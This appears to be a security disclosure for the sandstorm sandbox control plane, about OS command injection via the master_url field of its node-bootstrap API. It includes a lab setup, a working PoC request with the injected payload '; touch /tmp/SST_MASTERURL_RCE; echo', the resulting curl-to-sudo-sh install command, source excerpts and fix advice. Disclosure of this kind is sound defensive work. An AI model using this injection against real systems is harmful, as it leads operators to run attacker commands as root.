### Vulnerability details

**Official website / Product:** https://deeplethe.com / https://github.com/deeplethe/sandstorm

**Repository:** deeplethe/sandstorm (stars at selection: 3668)

**Vulnerability type:** RCE (OS command injection via generated `install_command` run as root)

**Vulnerability versions:** v0.6.0 tree (commit `3714ea26c0fff3654947fcecdbb9e6508ea0bf77`, default branch `dev`)

**Vulnerability URL / Parameter:** `POST /v1/node-bootstrap`; JSON field `master_url` (route sits on the bearer-token-guarded `guarded` Router alongside `/v1/nodes`, etc.)

**Complex:** yes

### Verification procedure

1. Start the lab (audited image name `sandstorm-r18a7:v0.6.0-net`; historical `labs/sandstorm-r18a7/` was cleaned — rebuild from the commit below). Check out the source and build the upstream `Dockerfile`, then start with the lab process args:

```bash
git clone https://github.com/deeplethe/sandstorm.git
cd sandstorm
git checkout 3714ea26c0fff3654947fcecdbb9e6508ea0bf77
```

```yaml
# docker-compose.yml (equivalent to the audited lab: container sandstorm-r18a7, listen 127.0.0.1:19807)
services:
  sandstorm:
    container_name: sandstorm-r18a7
    build: .
    image: sandstorm-r18a7:v0.6.0-net
    user: "0:0"
    network_mode: host
    command:
      - serve
      - --master
      - --node
      - --insecure-transport
      - --bind
      - 127.0.0.1:19807
      - --admit-min-free-mib
      - "0"
    volumes:
      - sandstorm-data:/var/lib/sandstorm
volumes:
  sandstorm-data:
```

```bash
docker compose up -d --build
# Expect: Container sandstorm-r18a7 Created / Started
# Process: sandstormd serve --master --node --insecure-transport --bind 127.0.0.1:19807 --admit-min-free-mib 0
# Listen: 127.0.0.1:19807
```

2. Read the control-plane API bearer token (matches `Authorization: Bearer ...` in the request):
   ```bash
   docker exec sandstorm-r18a7 cat /var/lib/sandstorm/pki/api-token
   # Lab value: 71d2ed79f4d8514c27a88c89b1d16835
   ```
3. Send the complete `POST /v1/node-bootstrap` below (`master_url` contains `; touch /tmp/SST_MASTERURL_RCE; echo`).
4. Observe unsanitized shell metacharacters inside the response JSON `install_command` (`;` breaks the intended `curl ... | sudo ...` one-liner).
5. Execute that `install_command` with `sh -c` (operator paste simulation):
   ```bash
   # After saving the response body as response.json:
   sh -c "$(jq -r .install_command < response.json)"
   # Or run the exact install_command text from the PoC fence below
   ls -la /tmp/SST_MASTERURL_RCE
   ```
6. Confirm `/tmp/SST_MASTERURL_RCE` exists. Captured execution log summary:
   ```text
   === executed install_command from bootstrap response ===
   curl -sSfL -k https://x.example; touch /tmp/SST_MASTERURL_RCE; echo/install.sh | sudo SANDSTORM_MASTER_URL=https://x.example; touch /tmp/SST_MASTERURL_RCE; echo \
       SANDSTORM_NODE_TOKEN=0715c0915b5604a5ff723ae8b8122b4a14bb958e4c169670b700a947087bf698.b3034464b5e637a58582c4054b27b89e sh
   === stdout ===
   SANDSTORM_NODE_TOKEN=0715c0915b5604a5ff723ae8b8122b4a14bb958e4c169670b700a947087bf698.b3034464b5e637a58582c4054b27b89e sh
   === stderr ===
   curl: (35) TLS connect error: error:0A000126:SSL routines::unexpected eof while reading
   sh: 1: echo/install.sh: not found
   usage: sudo -h | -K | -k | -V
   ...
   === marker ===
   /tmp/SST_MASTERURL_RCE exists size=0 mode=0o100664
   ```

### Complete vulnerability PoC

Complete HTTP request (Docker-verified):

```http
POST /v1/node-bootstrap HTTP/1.1
Host: 127.0.0.1:19807
Authorization: Bearer 71d2ed79f4d8514c27a88c89b1d16835
Content-Type: application/json
Content-Length: 90
Connection: close

{"master_url": "https://x.example; touch /tmp/SST_MASTERURL_RCE; echo", "pool": "default"}
```

Equivalent curl:

```bash
curl -sS -D- http://127.0.0.1:19807/v1/node-bootstrap \
  -H 'Authorization: Bearer 71d2ed79f4d8514c27a88c89b1d16835' \
  -H 'Content-Type: application/json' \
  --data-binary '{"master_url": "https://x.example; touch /tmp/SST_MASTERURL_RCE; echo", "pool": "default"}'
```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
content-type: application/json
content-length: 578
connection: close
date: Sun, 01 Nov 2026 18:38:24 GMT

{"token":"0715c0915b5604a5ff723ae8b8122b4a14bb958e4c169670b700a947087bf698.b3034464b5e637a58582c4054b27b89e","pool":"default","expires_at":1793559204,"install_command":"curl -sSfL -k https://x.example; touch /tmp/SST_MASTERURL_RCE; echo/install.sh | sudo SANDSTORM_MASTER_URL=https://x.example; touch /tmp/SST_MASTERURL_RCE; echo \\\n    SANDSTORM_NODE_TOKEN=0715c0915b5604a5ff723ae8b8122b4a14bb958e4c169670b700a947087bf698.b3034464b5e637a58582c4054b27b89e sh","ca_fingerprint":"0715c0915b5604a5ff723ae8b8122b4a14bb958e4c169670b700a947087bf698","first_fetch_is_unverified":true}
```

Exact `install_command` from the response (runnable with `sh` as-is):

```bash
curl -sSfL -k https://x.example; touch /tmp/SST_MASTERURL_RCE; echo/install.sh | sudo SANDSTORM_MASTER_URL=https://x.example; touch /tmp/SST_MASTERURL_RCE; echo \
    SANDSTORM_NODE_TOKEN=0715c0915b5604a5ff723ae8b8122b4a14bb958e4c169670b700a947087bf698.b3034464b5e637a58582c4054b27b89e sh
```

Verification result notes:

- Parsed command becomes: `curl ... https://x.example` → `touch /tmp/SST_MASTERURL_RCE` → `echo/install.sh | sudo ...` (`;` breaks the original one-liner pipe)
- After execution, `/tmp/SST_MASTERURL_RCE` exists: `exists size=0 mode=0o100664`
- Proves `master_url` is interpolated into a root install one-liner without shell-safe validation

### Vulnerability analysis

`POST /v1/node-bootstrap` returns a one-liner operators run **as root on a new machine** (product comments explicitly compare it to k3s / Tailscale / Actions runners). In the same module, `install_env()` allow-lists `fc_kernel` / `state_dir` because “they go into a shell command someone runs as root”, and enumerates `backend`, but `master_url` is only trimmed of a trailing `/` and then `format!`’d into `install_command` in two places (URL and `SANDSTORM_MASTER_URL=`) with no equivalent checks.

A caller with the API bearer token (control-plane root credential; route behind `require_token`) can supply a malicious `master_url` so the console/API hands operators a command that executes arbitrary host commands when pasted. This is not intentional in-sandbox `exec`/`eval`; it is control-plane generation of a host install command — same threat model as the already-hardened fields, with `master_url` left as a residual injection in the same string.

### Trigger / sink source (full path and line numbers):

Request body / `master_url` field:

```rust
# File: crates/sandstorm-core/src/master/api.rs
# Lines: 1469-1491
#[derive(Deserialize)]
struct BootstrapReq {
    #[serde(default = "default_pool")]
    pool: String,
    #[serde(default = "default_ttl")]
    ttl_secs: i64,
    /// How the new machine should reach this master. The master cannot work
    /// this out for itself: the address a node must dial is whatever the
    /// operator's network puts in front of us, not the socket we bound.
    master_url: String,
    #[serde(default)]
    backend: Option<String>,
    #[serde(default)]
    fc_kernel: Option<String>,
    #[serde(default)]
    state_dir: Option<String>,
}
```

Sink: `master_url` only has trailing `/` stripped, then interpolated into the root install one-liner (two `{master}` sites):

```rust
# File: crates/sandstorm-core/src/master/api.rs
# Lines: 1555-1587
/// Mint a token and render the one line that joins a new machine.
async fn node_bootstrap(
    State(st): State<St>,
    Json(req): Json<BootstrapReq>,
) -> Result<Json<BootstrapView>, ApiErr> {
    let env = install_env(&req)?;
    let secret = random_token();
    st.store()
        .create_node_token(&secret, &req.pool, req.ttl_secs)
        .map_err(|e| err(StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
    let token = st
        .ca_pin()
        .map(|pin| crate::tls::join_token(&pin, &secret))
        .unwrap_or(secret);
    let master = req.master_url.trim_end_matches('/');
    let pin = st.ca_pin();
    Ok(Json(BootstrapView {
        install_command: format!(
            "curl -sSfL -k {master}/install.sh | sudo SANDSTORM_MASTER_URL={master} \\\n    SANDSTORM_NODE_TOKEN={token}{env} sh"
        ),
        token,
        pool: req.pool,
        expires_at: now_secs() + req.ttl_secs,
        ca_fingerprint: pin,
        first_fetch_is_unverified: true,
    }))
}
```

Contrasting hardened `install_env` that still does not cover `master_url`:

```rust
# File: crates/sandstorm-core/src/master/api.rs
# Lines: 1492-1527
/// The installer variables a bootstrap request sets, checked: they go into a
/// shell command someone runs as root, so a path is held to characters that
/// need no quoting.
fn install_env(req: &BootstrapReq) -> Result<String, ApiErr> {
    let mut env = String::new();
    if let Some(b) = req.backend.as_deref().filter(|b| !b.is_empty()) {
        if !["auto", "gvisor", "runsc", "firecracker"].contains(&b) {
            return Err(err(
                StatusCode::BAD_REQUEST,
                format!("backend must be auto, gvisor or firecracker, not {b:?}"),
            ));
        }
        env.push_str(&format!(" SANDSTORM_BACKEND={b}"));
    }
    for (name, var, v) in [
        ("fc_kernel", "SANDSTORM_FC_KERNEL", &req.fc_kernel),
        ("state_dir", "SANDSTORM_STATE_DIR", &req.state_dir),
    ] {
        let Some(v) = v.as_deref().filter(|v| !v.is_empty()) else {
            continue;
        };
        let plain = v.starts_with('/')
            && !v.contains("..")
            && v.bytes()
                .all(|c| c.is_ascii_alphanumeric() || b"/._-".contains(&c));
        if !plain {
            return Err(err(
                StatusCode::BAD_REQUEST,
                format!(
                    "{name} must be an absolute path of letters, digits and . _ - / only, \
                     not {v:?}"
                ),
            ));
        }
        env.push_str(&format!(" {var}={v}"));
    }
    Ok(env)
}
```

Route registration (~line 462 in the same file): `.route("/v1/node-bootstrap", post(node_bootstrap))` on the `guarded` Router behind `require_token`.

### Fix notes

Validate `master_url` as strictly as `install_env` (or stricter): `http(s)://` plus safe host/port/path bytes only; reject whitespace and shell metacharacters `;|&$\`\`()` and newlines; quote interpolations. Prefer returning structured fields and letting a trusted client assemble the command.
